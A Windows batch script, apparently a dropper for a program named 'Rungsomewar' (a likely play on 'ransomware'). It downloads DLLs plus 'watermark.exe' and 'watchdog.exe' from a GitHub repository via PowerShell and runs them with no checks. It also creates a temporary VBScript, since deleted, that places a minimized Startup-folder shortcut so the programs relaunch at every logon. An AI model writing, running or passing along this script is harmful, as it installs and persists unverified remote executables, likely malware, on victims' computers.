@echo off
setlocal

:: Define the installation directory
set "INSTALL_DIR=%USERPROFILE%\AppData\Local\Rungsomewar"
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Create the installation directory if it doesn't exist
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo Downloading components...

:: Download DLLs
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2.dll' -OutFile '%INSTALL_DIR%\SDL2.dll'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2_ttf.dll' -OutFile '%INSTALL_DIR%\SDL2_ttf.dll'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/libfreetype-6.dll' -OutFile '%INSTALL_DIR%\libfreetype-6.dll'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/zlib1.dll' -OutFile '%INSTALL_DIR%\zlib1.dll'"

:: Download Executables
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watermark.exe' -OutFile '%INSTALL_DIR%\watermark.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watchdog.exe' -OutFile '%INSTALL_DIR%\watchdog.exe'"

echo Setting up Startup entries...

:: Create a secondary batch file to launch the apps
set "LAUNCHER=%INSTALL_DIR%\launch_apps.bat"
echo @echo off > "%LAUNCHER%"
echo cd /d "%INSTALL_DIR%" >> "%LAUNCHER%"
echo start "" "watermark.exe" >> "%LAUNCHER%"
echo start "" "watchdog.exe" >> "%LAUNCHER%"

:: Create a shortcut in the Startup folder using VBScript
set "VBS_SCRIPT=%TEMP%\create_shortcut.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo sLinkFile = "%STARTUP_FOLDER%\Rungsomewar_Startup.lnk" >> "%VBS_SCRIPT%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_SCRIPT%"
echo oLink.TargetPath = "%LAUNCHER%" >> "%VBS_SCRIPT%"
echo oLink.WindowStyle = 7 >> "%VBS_SCRIPT%"
echo oLink.Save >> "%VBS_SCRIPT%"

cscript /nologo "%VBS_SCRIPT%"
del "%VBS_SCRIPT%"

echo Installation complete. The applications will now run on startup.
echo Starting applications now...
start "" "%LAUNCHER%"

pause
